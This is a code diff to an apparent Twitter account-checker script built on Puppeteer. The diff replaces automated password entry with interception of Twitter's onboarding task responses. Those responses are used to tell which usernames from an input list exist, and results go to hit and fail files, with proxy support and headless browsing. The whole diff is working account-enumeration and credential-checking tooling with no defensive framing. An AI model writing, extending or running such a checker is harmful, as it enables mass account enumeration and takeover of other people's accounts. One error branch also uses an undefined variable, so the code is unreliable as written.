@@ -17,7 +17,8 @@ const PSW_TAG        = process.env.PSW_TAG
 const LGN_TAG        = process.env.LGN_TAG
 const OUT_FILE       = process.env.OUT_FILE
 const FAIL_FILE      = process.env.FAIL_FILE
-const DELAY_TIME     = process.env.DELAY_TIME;
+const DELAY_TIME     = process.env.DELAY_TIME
+const TWT_TASK_RUNNER= 'https://api.twitter.com/1.1/onboarding/task.json';
 
 function delay (time) {
     return new Promise(function(resolve) { 
@@ -45,7 +46,7 @@ exports.processLine = async function ({line, lap}){
     // open our lovely browser
     const browser = await puppeteer.launch({
         headless: true,
-        slowMo: 250,
+        // slowMo: 250,
         args: [USE_PROXY ? `--proxy-server=http=${USE_PROXY}` : '',
                 '--autoplay-policy=user-gesture-required',
                 '--disable-background-networking',
@@ -97,11 +98,82 @@ exports.processLine = async function ({line, lap}){
 
         // Remove inecesary data
         page.on('request', (req) => {
+            
             if(req.resourceType() == 'stylesheet' || req.resourceType() == 'font' || req.resourceType() == 'image'){
                 req.abort();
             }
             else {
                 req.continue();
+            }
+        });
+
+        // To-Do: mejorar código
+        page.on('response', async (res) => {
+            if(res.request().resourceType() === 'xhr'){
+                // Case: user doesn't exist
+                if(res.status() === 400 && res.url() == TWT_TASK_RUNNER){
+                    // Save in error file
+                    fs.appendFileSync(FAIL_FILE, `${line}:${usr.userName}\n`);
+
+                    const end = new Date()
+                    
+                    // Close browser - we do not waste our ram
+                    await browser.close();
+
+                    return new Promise(resolve => {
+                        setTimeout(() => {
+                            resolve({
+                                end: `Lap time estimated finish ${end - start} ms`,
+                                tail: `User does not exist - ${usr.userName}`
+                            })
+                        }, 10)
+                    })
+                }
+                // Case: challenge or normal users
+                if(res.status() === 200 && res.url() == TWT_TASK_RUNNER){
+                    let resJson = undefined
+                    try {
+                        resJson = await res.json()
+                        // console.log("runner :: ", resJson, usr.userName)
+                        if(resJson.subtasks && resJson.subtasks.length > 0){
+                            let subtask = resJson.subtasks[0]
+                            // Challenge check after enter password
+                            if(subtask.subtask_id == "LoginEnterPassword" || subtask.subtask_id == "AccountDuplicationCheck" || subtask.subtask_id == "LoginEnterAlternateIdentifierSubtask"){
+                                // Save hit
+                                fs.appendFileSync(OUT_FILE, `${line}:${usr.userName}\n`);
+
+                                const end = new Date()
+
+                                // Close browser - we do not waste our ram
+                                await browser.close();
+
+                                return new Promise(resolve => {
+                                    setTimeout(() => {
+                                        resolve({
+                                            end: `Lap time estimated finish ${end - start} ms`,
+                                            tail: ``
+                                        })
+                                    }, 10)
+                                })
+                            }
+                        }
+                    } catch (e){
+                        // All Fail - :cry_cat:
+                        fs.appendFileSync(FAIL_FILE, `${line}:${usr.userName}\n`);
+
+                        // Close browser - we do not waste our ram
+                        await browser.close();
+
+                        return new Promise((resolve, reject) => {
+                            setTimeout(() => {
+                                resolve({
+                                    end: `Lap time estimated finish ${end - start} ms`,
+                                    tail: errorTail
+                                })
+                            }, 10)
+                        })
+                    }
+                }
             }
         });
 
@@ -113,40 +185,8 @@ exports.processLine = async function ({line, lap}){
         await page.keyboard.sendCharacter(usr.userName)
         // Next step of flow
         await page.click(NEXT_TAG)
-        await delay(DELAY_TIME)
-        // Focus and fast send characters - password
-        const hasPassword = (await page.$(PSW_TAG)) || false;
-        if(hasPassword){
-            await page.focus(PSW_TAG)
-            await page.keyboard.sendCharacter(usr.password)
-            await delay(DELAY_TIME)
-            // Login action
-            await page.click(LGN_TAG)
-            await delay(DELAY_TIME)
-        }
-        // Check url if it's OK or not
-        const url = await page.evaluate(() => document.location.href);
-        const challenge = (await page.$('.css-1dbjc4n.r-1wbh5a2.r-dnmrzs')) || false;
-        const gotItBtn  = (await page.$('div[role=button].css-18t94o4.css-1dbjc4n.r-sdzlij.r-1phboty.r-rs99b7.r-1mnahxq.r-19yznuf.r-64el8z.r-1ny4l3l.r-1dye5f7.r-o7ynqc.r-6416eg.r-lrvibr')) || false;
-        const otherBtn  = (await page.$('div[role=button]')) || false;
+        await delay(DELAY_TIME);
 
-        console.log(`url: ${url} - Check url`)
-
-        // Success
-        if(url == TWT_HOME || url == TWT_CHALLENGE || challenge || gotItBtn || otherBtn){
-            // Save hit
-            fs.appendFileSync(OUT_FILE, `${line}:${usr.userName}\n`);
-            // To-Do add verified accounts check
-            console.log(`Account: ${usr.userName} - Checked success`)
-
-        } else if (url == TWT_LOGIN){
-            // Fail accounts
-            fs.appendFileSync(FAIL_FILE, `${line}:${usr.userName}\n`);
-        } else {
-            console.log(`Account: ${usr.userName} - Checked error - ${url}`)
-        }
-        
-        // Each line in input.txt will be successively available here as `line`.
     } catch (e){
         errorTail += `Error: ${e} - In account: ${usr.userName}\n`
         console.log("errorTail: ", errorTail)
@@ -159,7 +199,7 @@ exports.processLine = async function ({line, lap}){
     // Close browser - we do not waste our ram
     await browser.close();
     
-    return new Promise(resolve => {
+    return new Promise((resolve, reject) => {
         setTimeout(() => {
             resolve({
                 end: `Lap time estimated finish ${end - start} ms`,
